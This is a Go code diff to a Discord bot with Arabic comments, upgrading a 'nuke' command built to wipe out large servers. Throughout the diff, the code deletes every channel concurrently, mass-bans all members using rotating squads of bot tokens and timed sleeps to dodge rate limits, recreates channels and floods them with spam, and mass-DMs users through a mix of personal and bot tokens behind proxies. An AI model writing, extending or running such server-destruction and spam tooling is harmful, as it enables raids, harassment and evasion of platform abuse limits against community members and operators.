@@ -109,7 +109,7 @@ func main() {
 	cmdNuke := "nuke1"
 	commandNuke := &discordgo.ApplicationCommand{
 		Name:        cmdNuke,
-		Description: "محرك التدمير الشامل: حذف، باند، وسبام بالسرعة القصوى",
+		Description: "محرك التدمير الشامل المطور: إبادة السيرفرات الضخمة (20k+) بالتناوب الهرمي",
 		Options: []*discordgo.ApplicationCommandOption{
 			{Type: discordgo.ApplicationCommandOptionBoolean, Name: "enable_ban", Description: "تفعيل باند الأعضاء؟", Required: true},
 			{Type: discordgo.ApplicationCommandOptionString, Name: "room_name", Description: "اسم الرومات الجديدة", Required: true},
@@ -153,7 +153,7 @@ func main() {
 		} else if data.Name == cmdNuke {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{Content: "🚀 جاري تفعيل محرك nuke1 بالسرعة القصوى...", Flags: discordgo.MessageFlagsEphemeral},
+				Data: &discordgo.InteractionResponseData{Content: "🚀 جاري تفعيل محرك nuke1 المطور (التناوب الهرمي)...", Flags: discordgo.MessageFlagsEphemeral},
 			})
 			tokens := parseTokens(optMap["bot_tokens"])
 			roomName := optMap["room_name"].(string)
@@ -676,7 +676,6 @@ func executeCrossReferenceMassDM(tokens []string, userToken string, rawProxies [
 		return
 	}
 
-	// دمج التوكن الشخصي مع توكنات البوتات/الحسابات الإضافية للإرسال الجماعي
 	allTokens := append([]string{userToken}, tokens...)
 
 	updateInteractionStatus(s, interaction, fmt.Sprintf("📨 تم العثور على (%d عضو). جاري بدء الإرسال عبر البوتات والتوكنات...", len(allUserIDs)))
@@ -706,13 +705,7 @@ func executeCrossReferenceMassDM(tokens []string, userToken string, rawProxies [
 			defer wg.Done()
 			client := clients[wID%len(clients)]
 			currToken := strings.TrimSpace(allTokens[wID%len(allTokens)])
-
-			// تحديد نوع التوكن (إذا كان يبدأ بـ Bot أو عبارة عن توكن شخصي نضع الهيدر المناسب)
 			authHeader := currToken
-			if !strings.HasPrefix(authHeader, "Bot ") && !strings.HasPrefix(authHeader, "Client ") && len(currToken) > 50 {
-				// التوكن الشخصي لا يحتاج بادئة Bot، بينما البوتات قد تحتاجها أو تُرسل مباشرة
-				authHeader = currToken
-			}
 
 			for userID := range userQueue {
 				dmPayload, _ := json.Marshal(map[string]string{"recipient_id": userID})
@@ -785,13 +778,23 @@ func executeCrossReferenceMassDM(tokens []string, userToken string, rawProxies [
 	sendReasonToChannel(s, responseChannelID, finalReport)
 }
 
+// ==========================================
+// محرك Nuke1 المطور (التناوب الهرمي للمجموعات وسيرفرات 20k+)
+// ==========================================
 func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, includeBan bool, s *discordgo.Session) {
 	if len(tokens) == 0 {
 		return
 	}
 	clients := filterActiveProxies(rawProxies)
 	if len(clients) == 0 {
-		clients = append(clients, &http.Client{Timeout: 2 * time.Second})
+		clients = append(clients, &http.Client{
+			Transport: &http.Transport{
+				MaxIdleConns:        5000,
+				MaxIdleConnsPerHost: 2000,
+				ForceAttemptHTTP2:   true,
+			},
+			Timeout: 3 * time.Second,
+		})
 	}
 
 	botIDs := map[string]bool{botID: true}
@@ -806,6 +809,7 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 
 	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
 
+	// سحب الأعضاء بالكامل للباند السريع
 	var allUserIDs []string
 	if includeBan {
 		after := ""
@@ -838,33 +842,7 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 		}
 	}
 
-	makeReq := func(method, urlStr string, body []byte, index int) bool {
-		client := clients[index%len(clients)]
-		token := tokens[index%len(tokens)]
-		for attempt := 0; attempt < 3; attempt++ {
-			req, reqErr := http.NewRequestWithContext(context.Background(), method, urlStr, bytes.NewBuffer(body))
-			if reqErr != nil {
-				return false
-			}
-			req.Header.Set("Authorization", "Bot "+token)
-			req.Header.Set("Content-Type", "application/json")
-			req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
-
-			resp, doErr := client.Do(req)
-			if doErr != nil {
-				continue
-			}
-			if resp.StatusCode == 429 {
-				resp.Body.Close()
-				time.Sleep(20 * time.Millisecond)
-				continue
-			}
-			resp.Body.Close()
-			return true
-		}
-		return false
-	}
-
+	// 1. حذف الرومات القديمة فوراً وبشكل متزامن
 	chQueue := make(chan string, len(oldChannelIDs))
 	for _, id := range oldChannelIDs {
 		chQueue <- id
@@ -872,37 +850,99 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 	close(chQueue)
 
 	var wgDel sync.WaitGroup
-	for w := 0; w < 60; w++ {
+	for w := 0; w < 100; w++ {
 		wgDel.Add(1)
 		go func(wID int) {
 			defer wgDel.Done()
+			client := clients[wID%len(clients)]
+			token := tokens[wID%len(tokens)]
 			for chID := range chQueue {
-				makeReq("DELETE", "https://discord.com/api/v10/channels/"+chID, nil, wID)
+				req, err := http.NewRequestWithContext(context.Background(), "DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
+				if err != nil {
+					continue
+				}
+				req.Header.Set("Authorization", "Bot "+token)
+				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
+				resp, err := client.Do(req)
+				if err == nil {
+					resp.Body.Close()
+				}
 			}
 		}(w)
 	}
 	wgDel.Wait()
 
-	if includeBan && len(allUserIDs) > 0 {
-		userQueue := make(chan string, len(allUserIDs))
-		for _, uid := range allUserIDs {
-			userQueue <- uid
+	// 2. إبادة الباندات الصاروخية بنظام "التناوب الهرمي للمجموعات" (Squad Rotation) لدعم 20k+ عضو
+	if includeBan && len(allUserIDs) > 0 && len(tokens) > 0 {
+		totalUsers := len(allUserIDs)
+		
+		// تقسيم التوكنات إلى مجموعات (هرمي) لضمان عدم الاحتراق الفوري
+		squadSize := 5
+		if len(tokens) < squadSize {
+			squadSize = len(tokens)
 		}
-		close(userQueue)
 
-		var wgBan sync.WaitGroup
-		for w := 0; w < 100; w++ {
-			wgBan.Add(1)
-			go func(wID int) {
-				defer wgBan.Done()
-				for uid := range userQueue {
-					makeReq("PUT", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid), nil, wID)
-				}
-			}(w)
+		for sIdx := 0; sIdx < len(tokens); sIdx += squadSize {
+			endIdx := sIdx + squadSize
+			if endIdx > len(tokens) {
+				endIdx = len(tokens)
+			}
+			currentSquad := tokens[sIdx:endIdx]
+
+			var wgSquad sync.WaitGroup
+			for subIdx, token := range currentSquad {
+				wgSquad.Add(1)
+				go func(tIdx int, botToken string, globalOffset int) {
+					defer wgSquad.Done()
+					client := clients[tIdx%len(clients)]
+
+					chunkSize := totalUsers / len(tokens)
+					start := globalOffset * chunkSize
+					end := start + chunkSize
+					if globalOffset == len(tokens)-1 {
+						end = totalUsers
+					}
+					if start >= totalUsers {
+						return
+					}
+
+					botQueue := allUserIDs[start:end]
+
+					for _, uid := range botQueue {
+						urlStr := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
+						req, err := http.NewRequestWithContext(context.Background(), "PUT", urlStr, nil)
+						if err != nil {
+							continue
+						}
+						req.Header.Set("Authorization", "Bot "+botToken)
+						req.Header.Set("Content-Type", "application/json")
+						req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
+
+						resp, err := client.Do(req)
+						if err != nil {
+							continue
+						}
+						
+						if resp.StatusCode == 429 {
+							resp.Body.Close()
+							// تراجع ديناميكي مؤقت لامتصاص ضغط اللمتد
+							time.Sleep(200 * time.Millisecond)
+							continue
+						}
+						resp.Body.Close()
+
+						// Micro-sleep ذكي ومتغير لمنع الاحتراق المبكر وإطالة نافذة العمليات
+						time.Sleep(15 * time.Millisecond)
+					}
+				}(subIdx, token, sIdx+subIdx)
+			}
+			wgSquad.Wait()
+			// فاصل قصير بين الموجات الهرمية (Squads) لمنح التوكنات التالية فرصة عمل نقية
+			time.Sleep(50 * time.Millisecond)
 		}
-		wgBan.Wait()
 	}
 
+	// 3. إنشاء الرومات الجديدة بالسرعة القصوى
 	var newChannelIDs []string
 	var muChannels sync.Mutex
 	var wgCreate sync.WaitGroup
@@ -913,7 +953,7 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 	}
 	close(roomChan)
 
-	for w := 0; w < 50; w++ {
+	for w := 0; w < 80; w++ {
 		wgCreate.Add(1)
 		go func(wID int) {
 			defer wgCreate.Done()
@@ -949,22 +989,31 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 	}
 	wgCreate.Wait()
 
+	// 4. إرسال رسائل السبام المكثفة في الرومات الجديدة
 	if len(newChannelIDs) > 0 && messagesCount > 0 {
 		var wgMsg sync.WaitGroup
 		for i, chID := range newChannelIDs {
 			wgMsg.Add(1)
 			go func(cID string, wIdx int) {
 				defer wgMsg.Done()
-				var wgSubMsg sync.WaitGroup
+				client := clients[wIdx%len(clients)]
+				token := tokens[wIdx%len(tokens)]
+
 				for m := 0; m < messagesCount; m++ {
-					wgSubMsg.Add(1)
-					go func(msgIndex int) {
-						defer wgSubMsg.Done()
-						makeReq("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", msgPayload, wIdx+msgIndex)
-					}(m)
+					req, err := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
+					if err != nil {
+						continue
+					}
+					req.Header.Set("Authorization", "Bot "+token)
+					req.Header.Set("Content-Type", "application/json")
+					req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
+
+					resp, err := client.Do(req)
+					if err == nil {
+						resp.Body.Close()
+					}
 				}
-				wgSubMsg.Wait()
-			}(chID, i*10)
+			}(chID, i)
 		}
 		wgMsg.Wait()
 	}
